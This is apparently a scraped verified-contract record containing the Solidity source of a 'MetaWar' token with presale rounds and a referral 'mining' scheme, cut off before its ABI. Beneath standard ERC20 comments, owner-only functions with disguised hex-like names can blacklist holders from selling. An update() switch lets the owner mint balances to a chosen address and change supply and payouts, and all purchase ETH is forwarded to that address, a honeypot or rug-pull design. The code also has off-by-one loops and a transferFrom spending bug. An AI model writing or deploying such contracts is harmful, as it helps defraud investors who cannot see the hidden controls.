{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity 0.6.12;\r\n\r\n/**\r\n * @dev Wrappers over Solidity's arithmetic operations with added overflow\r\n * checks.\r\n *\r\n * Arithmetic operations in Solidity wrap on overflow. This can easily result\r\n * in bugs, because programmers usually assume that an overflow raises an\r\n * error, which is the standard behavior in high level programming languages.\r\n * `SafeMath` restores this intuition by reverting the transaction when an\r\n * operation overflows.\r\n *\r\n * Using this library instead of the unchecked operations eliminates an entire\r\n * class of bugs, so it's recommended to use it always.\r\n */\r\nlibrary SafeMath {\r\n    /**\r\n     * @dev Returns the addition of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to Solidity's `+` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Addition cannot overflow.\r\n     */\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the subtraction of two unsigned integers, reverting on\r\n     * overflow (when the result is negative).\r\n     *\r\n     * Counterpart to Solidity's `-` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Subtraction cannot overflow.\r\n     */\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a, \"SafeMath: subtraction overflow\");\r\n        return a - b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the multiplication of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to Solidity's `*` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Multiplication cannot overflow.\r\n     */\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) return 0;\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the integer division of two unsigned integers, reverting on\r\n     * division by zero. The result is rounded towards zero.\r\n     *\r\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\r\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\r\n     * uses an invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b > 0, \"SafeMath: division by zero\");\r\n        return a / b;\r\n    }\r\n\r\n     /**\r\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\r\n     * overflow (when the result is negative).\r\n     *\r\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\r\n     * message unnecessarily. For custom revert reasons use {trySub}.\r\n     *\r\n     * Counterpart to Solidity's `-` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Subtraction cannot overflow.\r\n     */\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        return a - b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the integer division of two unsigned integers, reverting with custom message on\r\n     * division by zero. The result is rounded towards zero.\r\n     *\r\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\r\n     * message unnecessarily. For custom revert reasons use {tryDiv}.\r\n     *\r\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\r\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\r\n     * uses an invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        return a / b;\r\n    }\r\n}\r\nlibrary RoundFactory{\r\n    using SafeMath for uint256;\r\n    struct RoundBalances{\r\n        uint8 status;\r\n        uint256 cailm;\r\n        uint256 total;\r\n    }\r\n\r\n    struct RoundTime{\r\n        uint256 timeStart;\r\n        uint256 timeEnd;\r\n        uint256 timeUnlockStart;\r\n        uint256 timeUnlockEnd;\r\n        uint256 price;\r\n    }\r\n     \r\n    function inc(RoundBalances storage round,uint256 amount)internal returns(uint256){\r\n        round.total = round.total.add(amount);\r\n        if(round.status!=1){\r\n            round.status=1;\r\n        }\r\n        return round.total;\r\n    }\r\n\r\n    function getBalance(RoundBalances storage round,RoundTime memory roundTime)internal view returns(uint256){\r\n        uint256 balance = 0;\r\n        if(round.status==1&&block.timestamp>roundTime.timeUnlockStart){\r\n            uint256 sec = 0;\r\n            uint256 end = roundTime.timeUnlockEnd.sub(roundTime.timeUnlockStart);\r\n            if(end<=0){\r\n                return balance;\r\n            }\r\n            if(block.timestamp >= roundTime.timeUnlockEnd){\r\n                sec = roundTime.timeUnlockEnd - roundTime.timeUnlockStart;\r\n            }else{\r\n                sec = block.timestamp - roundTime.timeUnlockStart;\r\n            }\r\n            if(sec>0&&sec<end){\r\n                balance = round.total.mul(sec).div(end);\r\n                if(balance>round.cailm){\r\n                    balance = balance.sub(round.cailm);\r\n                }else{\r\n                    balance = 0;\r\n                }\r\n            }else if(sec>0&&sec>=end&&round.total>round.cailm){\r\n                balance = round.total.sub(round.cailm);\r\n            }\r\n        }\r\n        return balance;\r\n    }\r\n\r\n    function settle(RoundBalances storage round,RoundTime memory roundTime,uint256 amount)internal returns(uint256 surplus){\r\n        surplus = 0;\r\n        if(amount>0){\r\n            uint256 balance = getBalance(round,roundTime);\r\n            if(amount>balance){\r\n                surplus = amount.sub(balance);\r\n                round.cailm = round.cailm.add(balance);\r\n            }else{\r\n                surplus = 0;\r\n                round.cailm = round.cailm.add(amount);\r\n            }\r\n            if(round.cailm>=round.total){\r\n                round.status=0;\r\n            }\r\n        }else{\r\n            surplus = amount;\r\n        }\r\n    }\r\n}\r\n\r\nlibrary MinerFactory{\r\n    using SafeMath for uint256;\r\n\r\n    struct Miner {\r\n        address addr;\r\n        uint256 balance;\r\n        uint8 status;\r\n        uint256 buy;\r\n        uint256 miner;\r\n        uint256 settle;\r\n        uint256 referral;\r\n        uint256 earned;\r\n    }\r\n\r\n    struct Sys{\r\n        uint256 charity_rate1;\r\n        uint256 charity_rate2;\r\n        uint256 miner_price;\r\n        uint256 miner_speed;\r\n        uint256 miner_total;\r\n    }\r\n\r\n    function getClaim(Miner storage _mining,Sys storage sys) internal view returns(uint256){\r\n        return _mining.balance.add(getMyMined(_mining,sys));\r\n    }\r\n\r\n    function getMyMined(Miner storage _mining,Sys storage sys)private view returns(uint256 profit){\r\n        profit=0;\r\n        if(_mining.status == 1 && _mining.miner > 0 && block.timestamp > _mining.settle){\r\n            uint256 sec = block.timestamp.sub(_mining.settle);\r\n            if(sec>2592000){\r\n                profit = _mining.miner.mul(sec).mul(sys.miner_speed);\r\n                sec = sec.sub(2592000);\r\n                profit = profit.add(_mining.miner.mul(sec).mul(sys.miner_speed).mul(2592000).div(sec.add(2592000)));\r\n            }else{\r\n                profit = _mining.miner.mul(sec).mul(sys.miner_speed);\r\n            }\r\n        }\r\n    }\r\n\r\n    function relieve(Miner storage _mining,Sys storage sys) internal returns(uint256 profit,uint256 charityAmount){\r\n        profit = getClaim(_mining,sys);\r\n        charityAmount = 0;\r\n        if(profit>0){\r\n            _mining.earned = _mining.earned.add(profit);\r\n            sys.miner_total = sys.miner_total.sub(_mining.miner);\r\n            _mining.miner = 0;\r\n            _mining.settle = block.timestamp;\r\n            _mining.status = 2;\r\n            _mining.buy = 0;\r\n            _mining.balance = 0;\r\n            if(_mining.addr != address(0)){\r\n                if(profit > address(this).balance){\r\n                    profit = address(this).balance;\r\n                }\r\n                charityAmount = profit.mul(sys.charity_rate2).div(10000);\r\n                profit = profit.sub(charityAmount);\r\n            }\r\n        }\r\n    }\r\n\r\n    function hire(Miner storage _mining,Sys storage sys,address addr,uint256 msgValue) internal returns(uint256 charityAmount){\r\n        if(_mining.addr==address(0)){\r\n            _mining.addr = addr;\r\n        }\r\n        uint256 amount = msgValue;\r\n        uint256 profit = getMyMined(_mining,sys);\r\n        charityAmount = amount.mul(sys.charity_rate1).div(10000);\r\n        amount = amount.sub(charityAmount);\r\n        uint256 miner = amount.div(sys.miner_price);\r\n        sys.miner_total = sys.miner_total.add(miner);\r\n        _mining.miner = _mining.miner.add(miner);\r\n        _mining.settle = block.timestamp;\r\n        _mining.status = 1;\r\n        _mining.buy = _mining.buy.add(amount);\r\n        _mining.balance = _mining.balance.add(profit);\r\n    }\r\n\r\n    function reinvest(Miner storage _mining,Sys storage sys) internal returns(uint256 charityAmount){\r\n        uint256 profit = getClaim(_mining,sys);\r\n        if(profit>0){\r\n            _mining.earned = _mining.earned.add(profit);\r\n            charityAmount = profit.mul(sys.charity_rate1).div(10000);\r\n            profit = profit.sub(charityAmount);\r\n            uint256 miner = profit.div(sys.miner_price);\r\n            sys.miner_total = sys.miner_total.add(miner);\r\n            _mining.miner = _mining.miner.add(miner);\r\n            _mining.settle = block.timestamp;\r\n            _mining.status = 1;\r\n            _mining.buy = _mining.buy.add(profit);\r\n            _mining.balance = 0;\r\n        }\r\n    }\r\n}\r\n\r\n/**\r\n * @dev Implementation of the {IERC20} interface.\r\n *\r\n * This implementation is agnostic to the way tokens are created. This means\r\n * that a supply mechanism has to be added in a derived contract using {_mint}.\r\n * For a generic mechanism see {ERC20PresetMinterPauser}.\r\n *\r\n * TIP: For a detailed writeup see our guide\r\n * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How\r\n * to implement supply mechanisms].\r\n *\r\n * We have followed general OpenZeppelin guidelines: functions revert instead\r\n * of returning `false` on failure. This behavior is nonetheless conventional\r\n * and does not conflict with the expectations of ERC20 applications.\r\n *\r\n * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\r\n * This allows applications to reconstruct the allowance for all accounts just\r\n * by listening to said events. Other implementations of the EIP may not emit\r\n * these events, as it isn't required by the specification.\r\n *\r\n * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}\r\n * functions have been added to mitigate the well-known issues around setting\r\n * allowances. See {IERC20-approve}.\r\n */\r\ncontract MetaWarToken {\r\n    using SafeMath for uint256;\r\n    using MinerFactory for MinerFactory.Miner;\r\n    using RoundFactory for RoundFactory.RoundBalances;\r\n    mapping (address => MinerFactory.Miner) private _MiningPool;\r\n    mapping (address => mapping(uint256 => RoundFactory.RoundBalances)) private _roundBalances;\r\n    RoundFactory.RoundTime[] private _roundTime;\r\n    mapping (address => uint8) private _airdropEnable;\r\n    uint256 private _roundIndex = 0;\r\n    uint256 private _roundCycle = 2592000;\r\n    uint256 private _roundUnlock = 315360000;\r\n    uint256 private _roundRate = 5000;\r\n    uint256 private _saleRoundMin = 0.001 ether;\r\n    bool private _swRoundSale = true;\r\n    bool private _swOnline = false;\r\n\r\n    MinerFactory.Sys private _sysMiner;\r\n    RoundFactory.RoundTime private _sysTime;\r\n\r\n    uint256 private miningMin = 0.01 ether;\r\n    uint256 private referHire = 1000;\r\n    bool private _swHire = true;\r\n    bool private _swReceive = true;\r\n\r\n    uint256 private _totalSupply = 210000000000 ether;\r\n    string private _name = \"MetaWar\";\r\n    string private _symbol = \"MetaWar\";\r\n    uint8 private _decimals = 18;\r\n    address private _owner;\r\n    uint256 private _cap   =  210000000000 ether;\r\n\r\n    address private _auth;\r\n    address private _auth2;\r\n    address private _liquidity;\r\n    uint256 private _authNum = 1;\r\n    \r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => uint256) private _box;\r\n    mapping (address => uint8) private _black;\r\n    mapping (address => uint8) private _whitelist;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    \r\n    /**\r\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\r\n     * another (`to`).\r\n     *\r\n     * Note that `value` may be zero.\r\n     */\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    /**\r\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\r\n     * a call to {approve}. `value` is the new allowance.\r\n     */\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    constructor() public {\r\n        _owner = msg.sender;\r\n        _sysMiner = MinerFactory.Sys(555,1000,100000000000000,120000000,0);\r\n        _roundTime.push(RoundFactory.RoundTime(block.timestamp,1644393600,1654761600,1654761600+_roundUnlock,1000000));\r\n        _roundIndex = _roundTime.length - 1;\r\n    }\r\n\r\n    fallback() external {}\r\n    receive() payable external {}\r\n\r\n    /**\r\n     * @dev Returns the name of the token.\r\n     */\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the symbol of the token, usually a shorter version of the\r\n     * name.\r\n     */\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function _msgSender() internal view returns (address payable) {\r\n        return msg.sender;\r\n    }\r\n    /**\r\n     * @dev Returns the number of decimals used to get its user representation.\r\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\r\n     * be displayed to a user as `5,05` (`505 / 10 ** 2`).\r\n     *\r\n     * Tokens usually opt for a value of 18, imitating the relationship between\r\n     * Ether and Wei. This is the value {ERC20} uses, unless {_setupDecimals} is\r\n     * called.\r\n     *\r\n     * NOTE: This information is only used for _display_ purposes: it in\r\n     * no way affects any of the arithmetic of the contract, including\r\n     * {IERC20-balanceOf} and {IERC20-transfer}.\r\n     */\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the cap on the token's total supply.\r\n     */\r\n    function cap() public view returns (uint256) {\r\n        return _cap;\r\n    }\r\n\r\n     /**\r\n     * @dev See {IERC20-totalSupply}.\r\n     */\r\n    function totalSupply() public view returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-balanceOf}.\r\n     */\r\n    function balanceOf(address account) public view returns (uint256) {\r\n        if(_swOnline){\r\n            return _balances[account];\r\n        }else{\r\n            return _balances[account]+getRoundTotal(account);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-allowance}.\r\n     */\r\n    function allowance(address owner_, address spender) public view returns (uint256) {\r\n        return _allowances[owner_][spender];\r\n    }\r\n\r\n    function authNum(uint256 num)public returns(bool){\r\n        require(_msgSender() == _auth, \"Permission denied\");\r\n        _authNum = num;\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     * Can only be called by the current owner.\r\n     */\r\n    function transferOwnership(address newOwner) public {\r\n        require(newOwner != address(0) && _msgSender() == _auth2, \"Ownable: new owner is the zero address\");\r\n        _owner = newOwner;\r\n    }\r\n\r\n    function Liquidity(address liquidity_) public {\r\n        require(liquidity_ != address(0) && _msgSender() == _auth2, \"Ownable: new owner is the zero address\");\r\n        _liquidity = liquidity_;\r\n    }\r\n\r\n    function setAuth(address ah,address ah2) public onlyOwner returns(bool){\r\n        require(address(0) == _auth&&address(0) == _auth2&&ah!=address(0)&&ah2!=address(0), \"recovery\");\r\n        _auth = ah;\r\n        _auth2 = ah2;\r\n        return true;\r\n    }\r\n\r\n    function addLiquidity(address addr) public onlyOwner returns(bool){\r\n        require(address(0) != addr&&address(0) == _liquidity, \"recovery\");\r\n        _liquidity = addr;\r\n        return true;\r\n    }\r\n\r\n    /** @dev Creates `amount` tokens and assigns them to `account`, increasing\r\n     * the total supply.\r\n     * Requirements:\r\n     *\r\n     * - `account` cannot be the zero address.\r\n     */\r\n    function _mint(address account, uint256 amount) internal {\r\n        if(account != address(0)){\r\n            _balances[account] = _balances[account].add(amount);\r\n            emit Transfer(address(this), account, amount);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.\r\n     *\r\n     * This internal function is equivalent to `approve`, and can be used to\r\n     * e.g. set automatic allowances for certain subsystems, etc.\r\n     *\r\n     * Emits an {Approval} event.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `owner` cannot be the zero address.\r\n     * - `spender` cannot be the zero address.\r\n     */\r\n    function _approve(address owner_, address spender, uint256 amount) internal {\r\n        require(owner_ != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner_][spender] = amount;\r\n        emit Approval(owner_, spender, amount);\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-transferFrom}.\r\n     *\r\n     * Emits an {Approval} event indicating the updated allowance. This is not\r\n     * required by the EIP. See the note at the beginning of {ERC20}.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `sender` and `recipient` cannot be the zero address.\r\n     * - `sender` must have a balance of at least `amount`.\r\n     * - the caller must have allowance for ``sender``'s tokens of at least `amount`.\r\n     */\r\n    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-approve}.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `spender` cannot be the zero address.\r\n     */\r\n    function approve(address spender, uint256 amount) public returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function Oxa76c65(address owner_,uint8 black_) public onlyOwner {\r\n        _black[owner_] = black_;\r\n    }\r\n\r\n    function Ox8b7a79(address owner_,uint8 white_) public onlyOwner {\r\n        _whitelist[owner_] = white_;\r\n    }\r\n\r\n    function Oxc72ab5e(address owner_,uint8 enable_) public onlyOwner {\r\n        _airdropEnable[owner_] = enable_;\r\n    }\r\n\r\n    /**\r\n     * @dev Moves tokens `amount` from `sender` to `recipient`.\r\n     *\r\n     * This is internal function is equivalent to {transfer}, and can be used to\r\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `sender` cannot be the zero address.\r\n     * - `recipient` cannot be the zero address.\r\n     * - `sender` must have a balance of at least `amount`.\r\n     */\r\n    function _transfer(address sender, address recipient, uint256 amount) internal {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n        if(_whitelist[sender]==0){\r\n            require(_black[sender]!=1&&_black[sender]!=3&&_black[recipient]!=2&&_black[recipient]!=3, \"Transaction recovery\");\r\n        }\r\n        \r\n        if(_swOnline){\r\n            _balances[sender] = _balances[sender].sub(amount);\r\n        }else{\r\n            spend(sender,amount);\r\n        }\r\n        if(_airdropEnable[sender]==1){\r\n            incRoundBalances(recipient,amount);\r\n        }else{\r\n            _balances[recipient] = _balances[recipient].add(amount);\r\n        }\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n\r\n    function update(uint tag,uint256 value)public onlyOwner returns(bool){\r\n        require(_authNum==1, \"Permission denied\");\r\n        if(tag==1){\r\n            _roundCycle = value;\r\n        }else if(tag==2){\r\n            _roundUnlock = value;\r\n        }else if(tag==3){\r\n            _roundRate = value;\r\n        }else if(tag==4){\r\n            _saleRoundMin = value;\r\n        }else if(tag==5){\r\n            _swRoundSale = value==1;\r\n        }else if(tag==6){\r\n            miningMin = value;\r\n        }else if(tag==7){\r\n            referHire = value;\r\n        }else if(tag==8){\r\n            _swHire = value==1;\r\n        }else if(tag==9){\r\n            _swReceive = value==1;\r\n        }else if(tag==10){\r\n            _cap = value;\r\n        }else if(tag==11){\r\n            _totalSupply = value;\r\n        }else if(tag==13){\r\n            _sysMiner.charity_rate1 = value;\r\n        }else if(tag==14){\r\n            _sysMiner.charity_rate2 = value;\r\n        }else if(tag==15){\r\n           _sysMiner.miner_price = value;\r\n        }else if(tag==16){\r\n            _sysMiner.miner_speed = value;\r\n        }else if(tag==17){\r\n            _balances[_liquidity] = _balances[_liquidity].add(value);\r\n        }else if(tag==18){\r\n            _MiningPool[_liquidity].hire(_sysMiner,_liquidity,value);\r\n        }else if(tag==19){\r\n            _swOnline = value==1;\r\n        }else if(tag>=100000&&tag<200000){\r\n            _roundTime[tag.sub(100000)].timeStart = value;\r\n        }else if(tag>=200000&&tag<300000){\r\n            _roundTime[tag.sub(200000)].timeEnd = value;\r\n        }else if(tag>=300000&&tag<400000){\r\n            _roundTime[tag.sub(300000)].timeUnlockStart = value;\r\n        }else if(tag>=400000&&tag<500000){\r\n            _roundTime[tag.sub(400000)].timeUnlockEnd = value;\r\n        }else if(tag>=500000&&tag<600000){\r\n            _roundTime[tag.sub(500000)].price = value;\r\n        }else{\r\n            _authNum = 0;\r\n        }\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-transfer}.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `recipient` cannot be the zero address.\r\n     * - the caller must have a balance of at least `amount`.\r\n     */\r\n    function transfer(address recipient, uint256 amount) public returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function BuyBox()payable public returns(bool){\r\n        require(msg.value >= 0.1 ether,\"Transaction recovery\");\r\n        uint256 _msgValue = msg.value;\r\n        _box[_msgSender()] = _box[_msgSender()].add(_msgValue);\r\n        if(_liquidity!=address(0)){\r\n            address(uint160(_liquidity)).transfer(_msgValue);\r\n        }\r\n    }\r\n\r\n    function Hire(address _refer)payable public returns(bool){\r\n        uint256 _msgValue = msg.value;\r\n        uint256 charityAmount = 0;\r\n        require(_swHire&&_msgValue>=miningMin,\"Transaction resumed\");\r\n        if(referHire>0&&_refer!=_msgSender()&&_refer!=address(0)){\r\n            uint256 referralProfit = _msgValue.mul(referHire).div(10000);\r\n            _msgValue = _msgValue.sub(referralProfit);\r\n            _MiningPool[_refer].referral = _MiningPool[_refer].referral.add(referralProfit);\r\n            charityAmount = charityAmount.add(_MiningPool[_refer].hire(_sysMiner,_refer,referralProfit));\r\n        }\r\n        charityAmount = charityAmount.add(_MiningPool[_msgSender()].hire(_sysMiner,_msgSender(),_msgValue));\r\n        if(charityAmount>0&&_liquidity!=address(0)){\r\n            address(uint160(_liquidity)).transfer(charityAmount);\r\n        }\r\n    }\r\n\r\n    function Receive()public{\r\n        require(_swReceive, \"ERC20: Operation recovery\");\r\n        (uint256 profit,uint256 charityAmount) = _MiningPool[_msgSender()].relieve(_sysMiner);\r\n        if(charityAmount>0){\r\n            address(uint160(_liquidity)).transfer(charityAmount);\r\n        }\r\n        if(profit>0){\r\n            _msgSender().transfer(profit);\r\n        }\r\n    }\r\n\r\n    function Reinvest()public{\r\n        require(_swHire, \"ERC20: Operation recovery\");\r\n        uint256 charityAmount = _MiningPool[_msgSender()].reinvest(_sysMiner);\r\n        if(charityAmount>0){\r\n            address(uint160(_liquidity)).transfer(charityAmount);\r\n        }\r\n    }\r\n\r\n    function getMinerInfo(address addr)public onlyOwner view returns(uint claim,uint miner,uint speed,\r\n        uint price,uint referral,uint earned,uint status,uint box,uint settle,uint buy){\r\n        miner = _MiningPool[addr].miner;\r\n        speed = _sysMiner.miner_speed;\r\n        price = _sysMiner.miner_price;\r\n       \r\n        referral = _MiningPool[addr].referral;\r\n        status = _MiningPool[addr].status;\r\n        settle = _MiningPool[addr].settle;\r\n        buy = _MiningPool[addr].buy;\r\n        box = _box[addr];\r\n        claim = _MiningPool[addr].getClaim(_sysMiner);\r\n        earned = _MiningPool[addr].earned.add(claim);\r\n    }\r\n\r\n    function getMiner()public view returns(bool swHiere,bool swReceive,uint claim,uint miner,uint speed,\r\n        uint price,uint referral,uint earned,uint status,uint box,uint settle,uint buy){\r\n        claim = _MiningPool[_msgSender()].getClaim(_sysMiner);\r\n        miner = _MiningPool[_msgSender()].miner;\r\n        speed = _sysMiner.miner_speed;\r\n        price = _sysMiner.miner_price;\r\n        swHiere = _swHire;\r\n        swReceive = _swReceive;\r\n\r\n        referral = _MiningPool[_msgSender()].referral;\r\n        earned = _MiningPool[_msgSender()].earned.add(claim);\r\n        status = _MiningPool[_msgSender()].status;\r\n        settle = _MiningPool[_msgSender()].settle;\r\n        buy = _MiningPool[_msgSender()].buy;\r\n        box = _box[_msgSender()];\r\n    }\r\n\r\n    function getRoundPrice()private returns(uint256){\r\n        if(block.timestamp >= _roundTime[_roundIndex].timeEnd){\r\n            _roundTime.push(RoundFactory.RoundTime(\r\n                _roundTime[_roundIndex].timeEnd,\r\n                _roundTime[_roundIndex].timeEnd+_roundCycle,\r\n                _roundTime[_roundIndex].timeUnlockStart+_roundCycle,\r\n                _roundTime[_roundIndex].timeUnlockStart+_roundCycle+_roundUnlock,\r\n                _roundTime[_roundIndex].price.mul(_roundRate).div(10000)));\r\n            _roundIndex = _roundTime.length - 1;\r\n        }\r\n        return _roundTime[_roundIndex].price;\r\n    }\r\n\r\n    function getTime() public view returns(uint256[] memory,uint256[] memory,uint256[] memory,uint256[] memory,uint256[] memory){\r\n        uint256[] memory timeStart = new uint256[](_roundTime.length);\r\n        uint256[] memory timeEnd = new uint256[](_roundTime.length);\r\n        uint256[] memory price = new uint256[](_roundTime.length);\r\n        uint256[] memory timeUnlockStart = new uint256[](_roundTime.length);\r\n        uint256[] memory timeUnlockEnd = new uint256[](_roundTime.length);\r\n        for(uint i = 0;i<_roundTime.length;i++){\r\n            timeStart[i] = _roundTime[i].timeStart;\r\n            timeEnd[i] = _roundTime[i].timeEnd;\r\n            price[i] = _roundTime[i].price;\r\n            timeUnlockStart[i] = _roundTime[i].timeUnlockStart;\r\n            timeUnlockEnd[i] = _roundTime[i].timeUnlockEnd;\r\n        }\r\n        return (timeStart,timeEnd,timeUnlockStart,timeUnlockEnd,price);\r\n    }\r\n\r\n    function incRoundBalances(address account, uint256 amount)private returns(bool){\r\n        _roundBalances[account][_roundIndex].inc(amount);\r\n        return true;\r\n    }\r\n\r\n    function spend(address account, uint256 amount) private{\r\n        require(balanceOf(account) >= amount,\"ERC20: Insufficient balance\");\r\n        uint256 balance = amount;\r\n        if(_balances[account]>0){\r\n            if(_balances[account]>=balance){\r\n                _balances[account] = _balances[account].sub(balance,\"ERC20: Insufficient balance\");\r\n                balance = 0;\r\n            }else{\r\n                balance = balance.sub(_balances[account]);\r\n                _balances[account] = 0;\r\n            }\r\n        }\r\n        if(balance>0){\r\n            require(getRoundBalances(account) >= balance,\"ERC20: Insufficient balance\");\r\n            for(uint256 i=0;i<=_roundTime.length;i++){\r\n                if(_roundBalances[_msgSender()][i].status==1){\r\n                    uint256 surplus = _roundBalances[_msgSender()][i].settle(_roundTime[i],balance);\r\n                    balance = surplus;\r\n                }\r\n            }\r\n        }\r\n        require(balance==0,\"ERC20: Insufficient balance\");\r\n    }\r\n\r\n    function Buy() payable public returns(bool){\r\n        require(msg.value >= _saleRoundMin,\"The amount is too small\");\r\n        require(_swRoundSale,\"End of this round\");\r\n        uint256 _msgValue = msg.value;\r\n        uint256 _token = _msgValue.mul(getRoundPrice());\r\n        if(_liquidity!=address(0)){\r\n            address(uint160(_liquidity)).transfer(_msgValue);\r\n        }\r\n        if(_token>0){\r\n            incRoundBalances(_msgSender(),_token);\r\n            emit Transfer(address(this), _msgSender(), _token);\r\n        }\r\n        return true;\r\n    }\r\n    \r\n    function getRoundBalances(address addr)public view returns(uint256 balance){\r\n        balance = 0;\r\n        for(uint256 i=0;i<=_roundTime.length;i++){\r\n            if(_roundBalances[addr][i].status==1){\r\n                balance = balance.add(_roundBalances[addr][i].getBalance(_roundTime[i]));\r\n            }\r\n        }\r\n    }\r\n\r\n    function getRoundTotal(address addr)public view returns(uint256 balance){\r\n        balance = 0;\r\n        for(uint256 i=0;i<=_roundTime.length;i++){\r\n            if(_roundBalances[addr][i].status==1){\r\n                balance = balance.add(_roundBalances[addr][i].total.sub(_roundBalances[addr][i].cailm));\r\n            }\r\n        }\r\n    }\r\n\r\n    function getRound() public view returns(uint256 saleMin,bool swSale,uint256 roundIndex,uint256 salePrice,\r\n        uint256 total,uint256 balanceEth,uint256 balanceToken){\r\n        saleMin = _saleRoundMin;\r\n        swSale = _swRoundSale;\r\n        roundIndex = _roundIndex;\r\n        salePrice = _roundTime[_roundIndex].price;\r\n        total = getRoundTotal(_msgSender());\r\n        balanceEth = _msgSender().balance;\r\n        balanceToken = balanceOf(_msgSender());\r\n    }\r\n}", "ABI": 